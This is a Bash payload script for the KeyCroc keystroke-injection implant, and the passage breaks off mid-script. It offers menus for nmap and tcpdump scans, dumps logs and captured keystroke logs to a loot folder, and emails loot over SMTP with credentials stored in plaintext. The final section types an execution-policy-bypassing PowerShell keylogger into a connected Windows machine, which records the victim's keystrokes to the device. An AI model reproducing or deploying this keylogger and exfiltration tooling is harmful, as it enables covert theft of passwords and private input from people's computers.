#!/bin/bash

##
# Title:         Croc_Pot 
# Description:   Email KeyCroc INFO & Log files & Nmap scan Plus save to loot folder and more
# Author:        Spywill
# Version:       1.0.1
# Category:      Key Croc
##

##
# Payload  Variables
##

CROC_FOLDER=/root/udisk/loot/Croc_Pot
CROC_FOLDER_A=/root/udisk/tools/Croc_Pot
DATE=$(date +%b-%d-%y---%r)
LINE=$(perl -e 'print "=" x 80,"\n"')
LINE_=$(perl -e 'print "*" x 10,"\n"')
LINE_A=$(perl -e 'print "-" x 15,"\n"')

##
# Create folder
##

if [[ -d "${CROC_FOLDER}" && "${CROC_FOLDER_A}" ]]; then
     LED B
     sleep 1
else    
     LED SETUP
     sleep 1
     mkdir -p ${CROC_FOLDER} ${CROC_FOLDER_A}
     LED FINISH
fi

##
# Color  Variables
##

green='\e[32m'
blue='\e[34m'
red='\e[31m'
yellow='\e[93m'
clear='\e[0m'

##
# Color Functions
##

ColorGreen() {
	echo -ne $green$1$clear
}
ColorBlue() {
	echo -ne $blue$1$clear
}
ColorYellow() {
	echo -ne $yellow$1$clear
}
ColorRed() {
	echo -ne $red$1$clear
}

##
# All Menu color Functions
##

MenuTitle() {
	echo -ne "\t\t\t\e[41;4;1m${1} ${2} ${3} ${4} ${5}${clear}\n"
}

MenuColor() {
    echo -ne "\t\t\t\e[40;1m${1}${clear}${green})${clear}\e[40;38;5;202;4m${2} ${3} ${4} ${5} ${6} ${7}${clear}\n"
}

MenuEnd() {
	echo -ne "\t\t\t\e[40;1m0${clear}${green})${clear}\e[40;4;32mEXIT              ${clear}
\t\t\e[40m$(ColorBlue 'CHOOSE AN OPTION AND PRESS [ENTER]:') ${clear}"
}

##
# Payload Functions
##

function croc_title() {
	echo -ne "\n\n\e[41;30m${LINE}${clear}
\e[40;31m${LINE_A}${clear}\e[40m>${clear}\e[40;31mKEYCROC${clear}\e[40m-${clear}\e[40;31mHAK${clear}\e[40m5${clear}\e[40m<${clear}\e[40;31m${LINE_A}${clear}\e[40m${yellow}KeyCroc IP: $(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-)           ${clear}
\e[40;31m   DEVELOPED BY ${clear}\e[40mSPYWILL ${clear}\e[40m                    ${clear}\e[40m${yellow}KeyCroc VER: $(cat /root/udisk/version.txt)                ${clear}
\e[40;31m   DATE OF SCAN${clear}\e[40m ${DATE}     ${clear}\e[40m${yellow}KeyCroc keyboard: $(sed -n 9p /root/udisk/config.txt)     ${clear}
\e[40;31m${LINE_A}${clear}\e[40;92m>CROC_POT<\e[40;31m${LINE_A}    ${clear}\e[40m${yellow}VER:1.0.1                           ${clear}
\e[41;30m${LINE}${clear}\n\n\n"	
}

function croc_title_loot() {
    echo -ne "\n${LINE}\n\t${LINE_A}>KEYCROC-HAK5<${LINE_A}\n\t\tDEVELOPED BY SPYWILL\n\t\tDATE OF SCAN-${DATE}\n\t${LINE_A}>CROC_POT<${LINE_A}\n${LINE}\n\n"
}

function invalid_entry() {
    LED R
    echo -ne "\n\t${LINE_}\e[40;5m$(ColorRed 'INVALID ENTRY PLEASE TRY AGAIN')${clear}${LINE_}\n"
}

##
#   - Nmap mean
##

function nmap_menu() {
	IP_WLAN=$(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-)
	LED SETUP
	croc_title
	LOOT_NMAP=/root/udisk/loot/Croc_Pot/KeyCroc_NMAP.txt

##
#   - Nmap Functions
#   - User IP Input Functions
##	
	
user_ip_f() {
	read -p "$(ColorBlue 'ENTER IP TO USE FOR NMAP SCAN AND PRESS [ENTER]'): " USER_IP
	LED B
	if [[ "${USER_IP}" == +([0-9]).+([0-9]).+([0-9]).+([0-9]) ]]; then
	LED B
	IP_SETUP=${USER_IP}
	echo -ne "\t${LINE_}\e[40m$(ColorGreen 'USING IP THAT WAS ENTER')${clear}${IP_SETUP}\n"
else
	LED R
	echo -ne "\t${LINE_}\e[40;4m$(ColorRed 'USING DEFAULT IP 192.168.1*')${clear}${LINE_}\n"
	IP_SETUP=192.168.1.*
fi
}
 
##
#  -Nmap Regular Scan Functions
##  
 
regular_scan() {	
	 LED ATTACK
	 user_ip_f
	 croc_title_loot | tee ${LOOT_NMAP} ; echo -e "\t${LINE_}NMAP REGULAR SCAN${LINE_}\n" | tee -a ${LOOT_NMAP} ; nmap ${IP_WLAN} ${IP_SETUP} | tee -a ${LOOT_NMAP}
}
  
##
#  -Nmap Quick_Scan Functions
##

quick_scan() {
	 LED ATTACK
	 user_ip_f
	 croc_title_loot | tee ${LOOT_NMAP} ; echo -e "\t${LINE_}NMAP QUICK SCAN${LINE_}\n" | tee -a ${LOOT_NMAP} ; nmap -T4 -F ${IP_WLAN} ${IP_SETUP} | tee -a ${LOOT_NMAP}
}
  
##
#  -Nmap Quick_Plus Scan Functions
##

quick_plus_scan() {
	 LED ATTACK
	 user_ip_f
	 croc_title_loot | tee ${LOOT_NMAP} ; echo -e "\t${LINE_}NMAP QUICK_PLUS SCAN${LINE_}\n" | tee -a ${LOOT_NMAP} ; nmap -sV -T4 -O -F --version-light ${IP_WLAN} ${IP_SETUP} | tee -a ${LOOT_NMAP}
}
  
##
#  -Nmap Ping Scan Functions
##

ping_scan() {
	 LED ATTACK
	 user_ip_f
	 croc_title_loot | tee ${LOOT_NMAP} ; echo -e "\t${LINE_}NMAP PING SCAN${LINE_}\n" | tee -a ${LOOT_NMAP} ; nmap -sn ${IP_WLAN} ${IP_SETUP} | tee -a ${LOOT_NMAP}
}
  
##
#  -Nmap Intense Scan Functions
##

intense_scan() {
	 LED ATTACK
	 user_ip_f
	 croc_title_loot | tee ${LOOT_NMAP} ; echo -e "\t${LINE_}NMAP INTENSE SCAN${LINE_}\n" | tee -a ${LOOT_NMAP} ; nmap -T4 -A -v ${IP_WLAN} ${IP_SETUP} | tee -a ${LOOT_NMAP}
}
  
##
#  -Nmap Interface Scan Functions
##
 
interface_scan() {
	 LED ATTACK
	 croc_title_loot | tee ${LOOT_NMAP} ; echo -e "\t${LINE_}NMAP INTERFACE SCAN${LINE_}\n" | tee -a ${LOOT_NMAP} ; nmap --iflist | tee -a ${LOOT_NMAP} 
}
  
##
#  -Nmap Port Scan Functions
##

port_scan() {
	 LED ATTACK
	 user_ip_f
	 croc_title_loot | tee ${LOOT_NMAP} ; echo -e "\t${LINE_}NMAP PORT SCAN${LINE_}\n" | tee -a ${LOOT_NMAP} ; nmap --top-ports 20 ${IP_WLAN} ${IP_SETUP} | tee -a ${LOOT_NMAP}
}
  
##
#  -Nmap Personal Scan Functions
##

personal_scan() {
	 LED ATTACK
	 croc_title_loot | tee ${LOOT_NMAP} ; echo -e "\t${LINE_}NMAP PERSONAL SCAN${LINE_}\n" ; echo -n " $(ColorBlue 'ENTER YOUR NMAP SCAN SETTING THEN PRESS [ENTER]'): " ; read PER_SCAN && ${PER_SCAN} | tee -a ${LOOT_NMAP}
}

##
#  -Nmap Connected Pc Scan Functions
##

pc_scan() {
    LED ATTACK
    CROC_OS_WIND=/root/udisk/loot/Croc_OS_wind.txt
    croc_os_v=/root/udisk/loot/Croc_OS_ip.txt
    if [ -e "${CROC_OS_WIND}" ]; then
    croc_title_loot | tee ${LOOT_NMAP} ; echo -e "\t${LINE_}CONNECTED PC SCAN${LINE_}\n" | tee -a ${LOOT_NMAP} ; nmap $(sed -n 4p ${CROC_OS_WIND}) | tee -a ${LOOT_NMAP}
else
    if [ -e "${croc_os_v}" ]; then
    croc_title_loot | tee ${LOOT_NMAP} ; echo -e "\t${LINE_}CONNECTED PC SCAN${LINE_}\n" | tee -a ${LOOT_NMAP} ; nmap $(sed -n 2p ${croc_os_v}) | tee -a ${LOOT_NMAP}
else
    echo -ne "\n\t\e[40m$(ColorRed 'PLEASE RUN CROC_POT PAYLOAD TO GET PC USER NAME AND IP')${clear}\n"
 fi
fi
}

##
#   - Nmap Scan Menu
##
 
LED B	
MenuTitle NMAP MENU
MenuColor  1 REGULAR SCAN______
MenuColor  2 QUICK SCAN________
MenuColor  3 QUICK PLUS________
MenuColor  4 PING SCAN_________
MenuColor  5 INTENSE SCAN______
MenuColor  6 INTERFACE SCAN____
MenuColor  7 PORT SCAN_________
MenuColor  8 PERSONAL SCAN_____
MenuColor  9 CONNECTED PC SCAN__
MenuColor 10 RETURN TO MAIN MENU
MenuEnd
        read d
        case $d in
        1) regular_scan ; nmap_menu ;;
        2) quick_scan ; nmap_menu ;;
        3) quick_plus_scan ; nmap_menu ;;
        4) ping_scan ; nmap_menu ;;
        5) intense_scan ; nmap_menu ;;
        6) interface_scan ; nmap_menu ;;
        7) port_scan ; nmap_menu ;;
        8) personal_scan ; nmap_menu ;;
        9) pc_scan ; nmap_menu ;;
        10) main_menu ;;
        0) exit 0 ;;
        *) invalid_entry ; nmap_menu ;;
        esac
}

##
#   - Key Croc Log mean
##

function croc_logs_mean() {
	LOOT_LOG=/root/udisk/loot/Croc_Pot/KeyCroc_LOG.txt
	LED B
	croc_title
MenuTitle KEYCROC LOG MENU
MenuColor  1 MESSAGES LOG______
MenuColor  2 KERNEL LOG________
MenuColor  3 SYSTEM LOG________
MenuColor  4 SYSSTAT LOG_______
MenuColor  5 DEBUG LOG_________
MenuColor  6 DPKG LOG__________
MenuColor  7 NTPSTATS LOG______
MenuColor  8 AUTH LOG__________
MenuColor  9 DMESG LOG_________
MenuColor 10 BOOTSTRAP LOG____
MenuColor 11 ALTERNATIVES LOG_
MenuColor 12 MAIL INFO LOG_____
MenuColor 13 DAEMON LOG_______
MenuColor 14 KEYSTROKES LOG___
MenuColor 15 RETURN TO MAIN MENU
MenuEnd
        read e
        case $e in
        1) croc_title_loot | tee ${LOOT_LOG} ; echo -e "\t${LINE_}MESSAGES_LOG${LINE_}\n" | tee -a ${LOOT_LOG} ; cat /var/log/messages | tee -a ${LOOT_LOG} ; croc_logs_mean ;;
        2) croc_title_loot | tee ${LOOT_LOG} ; echo -e "\t${LINE_}KERNEL_LOG${LINE_}\n" | tee -a ${LOOT_LOG} ; cat /var/log/kern.log | tee -a ${LOOT_LOG} ; croc_logs_mean ;;
        3) croc_title_loot | tee ${LOOT_LOG} ; echo -e "\t${LINE_}SYSTEM_LOG${LINE_}\n" | tee -a ${LOOT_LOG} ; cat /var/log/syslog | tee -a ${LOOT_LOG} ; croc_logs_mean ;;
        4) croc_title_loot | tee ${LOOT_LOG} ; echo -e "\t${LINE_}SYSSTAT_LOG${LINE_}\n" | tee -a ${LOOT_LOG} ; cat /var/log/sysstat | tee -a ${LOOT_LOG} ; croc_logs_mean ;;
        5) croc_title_loot | tee ${LOOT_LOG} ; echo -e "\t${LINE_}DEBUG_LOG${LINE_}\n" | tee -a ${LOOT_LOG} ; cat /var/log/debug | tee -a ${LOOT_LOG} ; croc_logs_mean ;;
        6) croc_title_loot | tee ${LOOT_LOG} ; echo -e "\t${LINE_}DPKG_LOG${LINE_}\n" | tee -a ${LOOT_LOG} ; cat /var/log/dpkg.log | tee -a ${LOOT_LOG} ; croc_logs_mean ;;
        7) croc_title_loot | tee ${LOOT_LOG} ; echo -e "\t${LINE_}NTPSTATS_LOG${LINE_}\n" | tee -a ${LOOT_LOG} ; cat /var/log/ntpstats | tee -a ${LOOT_LOG} ; croc_logs_mean ;;
        8) croc_title_loot | tee ${LOOT_LOG} ; echo -e "\t${LINE_}AUTH_LOG${LINE_}\n" | tee -a ${LOOT_LOG} ; cat /var/log/auth.log | tee -a ${LOOT_LOG} ; croc_logs_mean ;;
        9) croc_title_loot | tee ${LOOT_LOG} ; echo -e "\t${LINE_}DMESG_LOG${LINE_}\n" | tee -a ${LOOT_LOG} ; echo -e "$(dmesg)" | tee -a ${LOOT_LOG} ; croc_logs_mean ;;
        10) croc_title_loot | tee ${LOOT_LOG} ; echo -e "\t${LINE_}BOOTSTRAP_LOG${LINE_}\n" | tee -a ${LOOT_LOG} ; cat /var/log/bootstrap.log | tee -a ${LOOT_LOG} ; croc_logs_mean ;;
        11) croc_title_loot | tee ${LOOT_LOG} ; echo -e "\t${LINE_}ALTERNATIVES_LOG${LINE_}\n" | tee -a ${LOOT_LOG} ; cat /var/log/alternatives.log | tee -a ${LOOT_LOG} ; croc_logs_mean ;;
        12) croc_title_loot | tee ${LOOT_LOG} ; echo -e "\t${LINE_}MAIL_INFO_LOG${LINE_}\n" | tee -a ${LOOT_LOG} ; cat /var/log/mail.info | tee -a ${LOOT_LOG} ; croc_logs_mean ;;
        13) croc_title_loot | tee ${LOOT_LOG} ; echo -e "\t${LINE_}DAEMON_LOG${LINE_}\n" | tee ${LOOT_LOG} ; cat /var/log/daemon.log | tee -a ${LOOT_LOG} ; croc_logs_mean ;;
        14) croc_title_loot | tee ${LOOT_LOG} ; echo -e "\t${LINE_}KEYSTROKES_LOG${LINE_}\n" | tee -a ${LOOT_LOG} ; cat /root/udisk/loot/croc_char.log | tee -a ${LOOT_LOG} ; croc_logs_mean ;;
        15) main_menu ;;
        0) exit 0 ;;
        *) invalid_entry ; croc_logs_mean ;;
        esac
}

##
#   - Croc mail menu/function
##

function croc_mail() {
	PYTHON_MAIL=/root/udisk/tools/Croc_Pot/Croc_Mail.py
	USER_CR=/root/udisk/tools/Croc_Pot/user_email.txt
	LED B
	croc_title
echo -ne "$(ColorYellow '
--Send E-Mail with g-mail or OutLook\n
--Send ATTACHMENT\n
--Add MESSAGE\n
Select g-mail or outlook then Enter your e-mail address\n
enter your e-mail password\n 
Enter the e-mail to send to then enter an MESSAGE\n
if no default will be selected\n
Enter ATTACHMENT yes or no when done e-mail will be sent')\n\n"

##
#  -User Smtp input Functions
##

user_smtp() {
MenuTitle SELECT EMAIL PROVIDER
MenuColor 1 GMAIL___________
MenuColor 2 OUTLOOK_________
MenuColor 3 RETURN TO MAIN MENU
MenuEnd
        read mail
        case $mail in
        1) GMAIL=smtp.gmail.com ; echo ${GMAIL} >> ${USER_CR} ;;
        2) OUTLOOK=smtp-mail.outlook.com ; echo ${OUTLOOK} >> ${USER_CR} ;;
        3) main_menu ;;
        0) exit 0 ;;
        *) invalid_entry ; user_smtp ;;
        esac
}

##
#  -User E-mail input Functions
##

function user_email_set() {
	
##
#  -Replace user input with Asterisk (*)
##
	
user_input_passwd() {
    unset password
    unset chartCount
    echo -n "$(ColorBlue 'ENTER YOUR EMAIL PASSWORD AND PRESS [ENTER]:') "
    while IFS= read -r -n1 -s char; do
    case "$char" in
    $'\0') break ;;
    $'\177') if [ ${#password} -gt 0 ]; then
                echo -ne "\b \b"
                password=${password::-1}
             fi ;;
          *)    chartCount=$((chartCount+1))
                echo -n '*'
                password+="$char" ;;
    esac
done
echo $password >> ${USER_CR}
echo ""
}

LED SETUP
read -p "$(ColorBlue 'ENTER YOUR EMAIL AND PRESS [ENTER]:') " E_MAIL_MY ; echo ${E_MAIL_MY} >> ${USER_CR}
user_input_passwd
read -p "$(ColorBlue 'ENTER EMAIL TO SEND LOOT TO AND PRESS [ENTER]:') " E_MAIL_SEND ; echo ${E_MAIL_SEND} >> ${USER_CR}  
}

##
#  -Python file send Functions
##

function mail_file() {
	
python_v() {
	LED B
        FILE_A_B="file_location_${CHANGE_FILE} ="  
        FILE_B_B="filename_${CHANGE_FILE} = os.path.basename(file_location_${CHANGE_FILE})" 
        FILE_C_B="attachment_${CHANGE_FILE} = open(file_location_${CHANGE_FILE}, 'rb')"
        FILE_D_B="part_${CHANGE_FILE} = MIMEBase('application', 'octet-stream')"
        FILE_E_B="part_${CHANGE_FILE}.set_payload(attachment_${CHANGE_FILE}.read())"
        FILE_F_B="encoders.encode_base64(part_${CHANGE_FILE})"
        FILE_G_B="part_${CHANGE_FILE}.add_header('Content-Disposition', \"attachment; filename= %s\" % filename_${CHANGE_FILE})"
        FILE_H_B="msg.attach(part_${CHANGE_FILE})"
        FILE_I_B="${CHANGE_FILE_A}"
}
	
##
#  - Mail Nmap Functions
##
		
send_file_a() {
    LOOT_NMAP=/root/udisk/loot/Croc_Pot/KeyCroc_NMAP.txt
    if [ -e "${LOOT_NMAP}" ]; then			   
    CHANGE_FILE="C"
    CHANGE_FILE_A="'/root/udisk/loot/Croc_Pot/KeyCroc_NMAP.txt'"
    LED B
    python_v
    echo -ne "\e[40m$(ColorGreen 'THIS FILE') ${LOOT_NMAP} $(ColorGreen 'WILL BE SENT \nTO THIS E-MAIL') $(sed -n 4p ${USER_CR})${clear}" 			   
else 
    LED R
    echo -ne ${LINE_}"\e[40;4;5m$(ColorRed 'PLEASE RUN AN NMAP SCAN FIRST STARTING NMAP MENU')${clear}"${LINE_}		       
    nmap_menu
fi		       		       		
}
	
##
#  - Mail KeyCroc Log Functions
##	
	
send_file_b() {
    LOOT_LOG=/root/udisk/loot/Croc_Pot/KeyCroc_LOG.txt
    if [ -e "${LOOT_LOG}" ]; then
    CHANGE_FILE="B"
    CHANGE_FILE_A="'/root/udisk/loot/Croc_Pot/KeyCroc_LOG.txt'"
    LED B
    python_v
    echo -ne "\e[40m$(ColorGreen 'THIS FILE') ${LOOT_LOG} $(ColorGreen 'WILL BE SENT \nTO THIS E-MAIL') $(sed -n 4p ${USER_CR})${clear}" 			   
else
    LED R
    echo -ne ${LINE_}"\e[40;4;5m$(ColorRed 'PLEASE RUN AN KEYCROC LOG SCAN FIRST STARTING CROC LOG MENU')${clear}"${LINE_}		       
    croc_logs_mean
fi
}
	
##
#  - Mail Windows Log Functions
##	
	
send_file_c() {
    LOOT_WIND=/root/udisk/loot/Croc_Pot/KeyCroc_Wind_LOG.txt
    if [ -e "${LOOT_WIND}" ]; then
    CHANGE_FILE=""
    CHANGE_FILE_A="'/root/udisk/loot/Croc_Pot/KeyCroc_Wind_LOG.txt'"
    LED B
    python_v
    echo -ne "\e[40m$(ColorGreen 'THIS FILE') ${LOOT_WIND} $(ColorGreen 'WILL BE SENT \nTO THIS E-MAIL') $(sed -n 4p ${USER_CR})${clear}" 			   
else
    LED R
    echo -ne ${LINE_}"\e[40;4;5m$(ColorRed 'PLEASE RUN AN WINDOWS LOG SCAN FIRST STARTING WINDOWS LOG')${clear}"${LINE_}
    windows_check
fi
}

##
#  - Mail Keycroc Info
##	
	
send_file_d() {
    LOOT_INFO=/root/udisk/loot/Croc_Pot/KeyCroc_INFO.txt
    if [ -e "${LOOT_INFO}" ]; then
    CHANGE_FILE="D"
    CHANGE_FILE_A="'/root/udisk/loot/Croc_Pot/KeyCroc_INFO.txt'"
    LED B
    python_v
    echo -ne "\e[40m$(ColorGreen 'THIS FILE') ${LOOT_INFO} $(ColorGreen 'WILL BE SENT \nTO THIS E-MAIL') $(sed -n 4p ${USER_CR})${clear}" 			   
else
    LED R
    echo -ne ${LINE_}"\e[40;4;5m$(ColorRed 'PLEASE RUN AN KEYCROC STATUS SCAN FIRST STARTING KEYCROC INFO SCAN ')${clear}"${LINE_}
    croc_status
fi
}
	
##
#  - Mail Attachment Functions
##	
	
send_file_e() {
    read -p "$(ColorBlue 'ENTER THE PATH OF YOUR ATTACHMENT AND PRESS [ENTER]:') " ATT_PATH
    if [ -e "${ATT_PATH}" ]; then
    CHANGE_FILE="P"
    CHANGE_FILE_A="'${ATT_PATH}'"
    LED B
    python_v
    echo -ne "\n\e[40m$(ColorGreen 'THIS FILE') ${ATT_PATH} $(ColorGreen 'WILL BE SENT \nTO THIS E-MAIL') $(sed -n 4p ${USER_CR})${clear}\n" 			   
else
    LED R
    echo -ne "\n${LINE_}\e[40;4;5m$(ColorRed 'FILE DOES NOT EXIST PLEASE TRY AGAIN')${clear}${LINE_}\n"		       
fi
}

##
#   - Croc Mail Select File Menu
##
		
MenuTitle SELECT FILE TO E-MAIL
MenuColor 1 NMAP SCAN________
MenuColor 2 KEYCROC LOG______
MenuColor 3 WINDOW SCAN______
MenuColor 4 KEYCROC INFO_____
MenuColor 5 ADD ATTACHMENT___
MenuColor 6 RETURN TO MAIN MENU
MenuEnd
        read mail_A
        case $mail_A in
	1) send_file_a ;;
	2) send_file_b ;;
        3) send_file_c ;;
        4) send_file_d ;;
        5) send_file_e ;;
        6) main_menu ;;
        0) exit 0 ;;
	    *) invalid_entry ; mail_file ;;
        esac
   }
  
##
#  - Python E-mail Functions
##  

python_email() {
	LED B
USER_EMAL=$(sed -n 2p ${USER_CR})
USER_PASSWD=$(sed -n 3p ${USER_CR})
USER_SEND=$(sed -n 4p ${USER_CR})
USER_SMTP=$(sed -n 1p ${USER_CR})
rm ${PYTHON_MAIL}
LED SETUP
sleep 1
echo -ne "import smtplib\nfrom email.mime.text import MIMEText\nfrom email.mime.multipart import MIMEMultipart\nfrom email.mime.base import MIMEBase\nfrom email import encoders\nimport os.path\n\nemail = '${USER_EMAL}'\npassword = '${USER_PASSWD}'\nsend_to_email = '${USER_SEND}'\n
\nsubject = 'CROC_MAIL'\nmessage = '${MY_MESS}${MY_MESS_A}'\n\n${WIN_A} ${WIN_I}\n${FILE_A_A} ${FILE_I_A}\n${FILE_A} ${FILE_I}\n${FILE_A_B} ${FILE_I_B}\n${FILE_A_P} ${FILE_I_P}\n
msg = MIMEMultipart()\nmsg['From'] = email\nmsg['To'] = send_to_email\nmsg['Subject'] = subject\nmsg.attach(MIMEText(message, 'plain'))\n\n${WIN_B}\n${WIN_C}\n${WIN_D}\n${WIN_E}\n${WIN_F}\n${WIN_G}\n 
${FILE_B_A}\n${FILE_C_A}\n${FILE_D_A}\n${FILE_E_A}\n${FILE_F_A}\n${FILE_G_A}\n${FILE_B_}\n${FILE_C_}\n${FILE_D}\n${FILE_E}\n${FILE_F}\n${FILE_G}\n
${FILE_B_B}\n${FILE_C_B}\n${FILE_D_B}\n${FILE_E_B}\n${FILE_F_B}\n${FILE_G_B}\n${FILE_B_P}\n${FILE_C_P}\n${FILE_D_P}\n${FILE_E_P}\n${FILE_F_P}\n${FILE_G_P}\n
${WIN_H}\n${FILE_H_A}\n${FILE_H}\n${FILE_H_B}\n${FILE_H_P}\n\nserver = smtplib.SMTP('${USER_SMTP}', 587)\nserver.starttls()\nserver.login(email, password)\ntext = msg.as_string()\nserver.sendmail(email, send_to_email, text)\nserver.quit()" >> ${PYTHON_MAIL}
LED B
sleep 1
python ${PYTHON_MAIL}
LED FINISH
sleep 1
}

if [ -e "${USER_CR}" ]; then
    LED B
    echo -ne "\e[40m$(ColorBlue 'WOULD YOU LIKE TO USE EXISTING EMAIL SETTING TYPE YES OR NO AND PRESS [ENTER]:')${clear} "; read EMAIL_SETTING
	case $EMAIL_SETTING in
	[yY] | [yY][eE][sS] )
	LED B
	echo -ne "${LINE_}\e[40m$(ColorGreen 'KEEPING EXISTING EMAIL SETTING')${clear}${LINE_}\n" ;;
	[nN] | [nN][oO] )
	LED SETUP
	rm ${USER_CR}
	user_smtp
	user_email_set ;;
	*)
	invalid_entry ; croc_mail ;;
 esac
else
       LED SETUP
       echo -ne "\n${LINE_}\e[40;4;5m$(ColorRed 'NO EXISTING EMAIL SETTING WERE FOUND PLEASE ENTER YOUR EMAIL SETTING')${clear}${LINE_}\n\n"
       user_smtp
       user_email_set
fi 
read -p "$(ColorBlue 'ENTER A PERSONAL MESSAGE YES OR NO AND PRESS [ENTER]:') " MAIL_MESS
	case $MAIL_MESS in
	[yY] | [yY][eE][sS] )
			    LED SETUP
			    read -p "$(ColorBlue 'ENTER YOUR MESSAGE AND PRESS [ENTER]:') " MY_MESS ;;
	    [nN] | [nN][oO] )
			    LED B
			    DEF_MESS=$(perl -e 'print "KEYCROC-HAK5---DEVELOPED BY SPYWILL ---Croc_Mail"')
			    MY_MESS_A=${DEF_MESS} ;;
			   *) 
			    invalid_entry ;;
	esac
read -p "$(ColorBlue 'ADD ATTACHMENT ENTER YES OR NO AND PRESS [ENTER]:') " MAIL_MESS
	case $MAIL_MESS in
	[yY] | [yY][eE][sS] )
			    LED SETUP
			    mail_file ;;
	    [nN] | [nN][oO] )
			    LED B
			    echo -ne "\n\e[40m$(ColorGreen 'SENDING EMAIL')${clear}\n" ;;
			   *)
			    invalid_entry ; mail_file ;;
	esac
python_email
main_menu

}

##
#   - Croc pot plus menu 
##

function croc_pot_plus() {
	LED SETUP
	croc_title
	
##
#   - Tcpdump  Functions
##
	
tcpdump_scan() {
    LOOT_TCPDUMP=/root/udisk/loot/Croc_Pot/tcpdump.pcap
    LED ATTACK
    rm -f ${LOOT_TCPDUMP}
    echo -ne "\n-$(ColorYellow 'THIS WILL START TCPDUMP SCAN AND SAVE TO LOOT FOLDER PRESS\n 
    CTRL + C TO STOP TCPDUMP SCAN :')\n\n"

interface_tcpdump() {    
    LED ATTACK
    tcpdump -D | tee ${LOOT_TCPDUMP}
}
  
hex_ascII_tcpdump() {
    LED ATTACK
    tcpdump -XX -i any | tee ${LOOT_TCPDUMP}
}
  
ip_tcpdump() {
    LED ATTACK
    tcpdump -n -i any | tee ${LOOT_TCPDUMP}
}
  
current_tcpdump() {
    LED ATTACK
    tcpdump | tee ${LOOT_TCPDUMP}
}      
    
user_tcpdump() {
    LED ATTACK
    echo -ne "\n$(ColorBlue 'ENTER TCPDUMP SCAN THEN PRESS [ENTER]:') "; read TCPDUMP_SCAN && ${TCPDUMP_SCAN} | tee ${LOOT_TCPDUMP}
}

##
#   - Tcpdump Scan Menu
##
    
MenuTitle TCPDUMP SCAN MENU
MenuColor 1 TCPDUMP INTERFACE SCAN_______
MenuColor 2 TCPDUMP PACKETS IN HEX AND ASCll
MenuColor 3 TCPDUMP PACKETS WITH IP ADDRESS
MenuColor 4 SCAN CURRENT NETWORK INTERFACE
MenuColor 5 ENTER AN TCPDUMP SCAN_________
MenuColor 6 RETURN TO MAIN MENU___________
MenuEnd
        read a_f
        case $a_f in
	    1) interface_tcpdump ; tcpdump_scan ;;
	    2) hex_ascII_tcpdump ; tcpdump_scan ;;
	    3) ip_tcpdump ; tcpdump_scan ;;
	    4) current_tcpdump ; tcpdump_scan ;;
	    5) user_tcpdump ; tcpdump_scan ;;
	    6) main_menu ;;
	    0) exit 0 ;;
	    *) invalid_entry ; tcpdump_scan ;;
	    esac
}

##
#   - Windows laptop keystorkes Functions
##

keystorkes_laptop() {
    LED SETUP
    CROC_OS=/root/udisk/loot/Croc_OS.txt
    OS_CHECK=$(sed -n 1p ${CROC_OS})
    echo -ne "\n${yellow}KeyCroc is pluged into OS${clear} --> $OS_CHECK\n" 
echo -ne "\n$(ColorYellow '
--TO STOP THE PAYLOAD PRESS Ctrl + c\n
--When stop this will open up notepad and save to loot/Croc_mail\n
--Still need second keyboard pluged into the keycroc to start the payload\n')\n"
    if [ "${OS_CHECK}" = WINDOWS ]; then
	   ATTACKMODE HID STORAGE
sleep 5
Q GUI r
sleep 2
Q STRING "powershell -nop -ex Bypass"
Q ENTER
sleep 1
Q STRING "\$Croc = (gwmi win32_volume -f 'label=\"KeyCroc\"' | Select-Object -ExpandProperty DriveLetter)"
Q ENTER
sleep 1
Q STRING "function Test-KeyLogger(\$LOOTDIR=\"\$Croc\loot\Croc_Pot\winkeylogger.txt\")"
Q ENTER
Q STRING "{"
Q ENTER
##
#--> API declaration
##
Q STRING  "\$APIsignatures = @'"
Q ENTER
Q STRING "[DllImport(\"user32.dll\", CharSet=CharSet.Auto, ExactSpelling=true)]"
Q ENTER 
Q STRING "public static extern short GetAsyncKeyState(int virtualKeyCode);"
Q ENTER 
Q STRING "[DllImport(\"user32.dll\", CharSet=CharSet.Auto)]"
Q ENTER
Q STRING "public static extern int GetKeyboardState(byte[] keystate);"
Q ENTER
Q STRING "[DllImport(\"user32.dll\", CharSet=CharSet.Auto)]"
Q ENTER
Q STRING "public static extern int MapVirtualKey(uint uCode, int uMapType);"
Q ENTER
Q STRING "[DllImport(\"user32.dll\", CharSet=CharSet.Auto)]"
Q ENTER
Q STRING "public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);"
Q ENTER
Q STRING "'@"
Q ENTER
Q STRING "\$API = Add-Type -MemberDefinition \$APIsignatures -Name 'Win32' -Namespace API -PassThru"
Q ENTER
##
#--> output file
##
Q STRING "\$no_output = New-Item -Path \$LOOTDIR -ItemType File -Force"
Q ENTER
Q STRING "try"
Q ENTER
Q STRING "{"
Q ENTER
Q STRING "Write-Host 'Keylogger started. Press CTRL+C to see results...' -ForegroundColor Red"
Q ENTER
Q STRING "while (\$true) {"
Q ENTER
Q STRING "Start-Sleep -Milliseconds 40"
Q ENTER            
Q STRING "for (\$ascii = 9; \$ascii -le 254; \$ascii++) {"
Q ENTER
##
#--> get key state
##
Q STRING "\$keystate = \$API::GetAsyncKeyState(\$ascii)"
Q ENTER
##
#--> if key pressed
##
Q STRING "if (\$keystate -eq -32767) {"
Q ENTER
Q STRING "\$null = [console]::CapsLock"
Q ENTER
##
#--> translate code
##
Q STRING "\$virtualKey = \$API::MapVirtualKey(\$ascii, 3)"
Q ENTER
##
#--> get keyboard state and create stringbuilder
##
Q STRING "\$kbstate = New-Object Byte[] 256"
Q ENTER
Q STRING "\$checkkbstate = \$API::GetKeyboardState(\$kbstate)"
Q ENTER
Q STRING "\$loggedchar = New-Object -TypeName System.Text.StringBuilder"
Q ENTER
##
#--> translate virtual key
##          
Q STRING "if (\$API::ToUnicode(\$ascii, \$virtualKey, \$kbstate, \$loggedchar, \$loggedchar.Capacity, 0))"
Q ENTER 
Q STRING "{"
Q ENTER
##
#--> if success, add key to logger file
##
Q STRING "[System.IO.File]::AppendAllText(\$LOOTDIR, \$loggedchar, [System.Text.Encoding]::Unicode)"
Q ENTER 
Q STRING "}"
Q ENTER
Q STRING "}"
Q ENTER
Q STRING "}"
Q ENTER
Q STRING "}"
Q ENTER
Q STRING "}"
Q ENTER
Q STRING "finally"
Q ENTER
Q STRING "{"
Q ENTER    
Q STRING "notepad \$LOOTDIR"
Q ENTER
Q STRING "}"
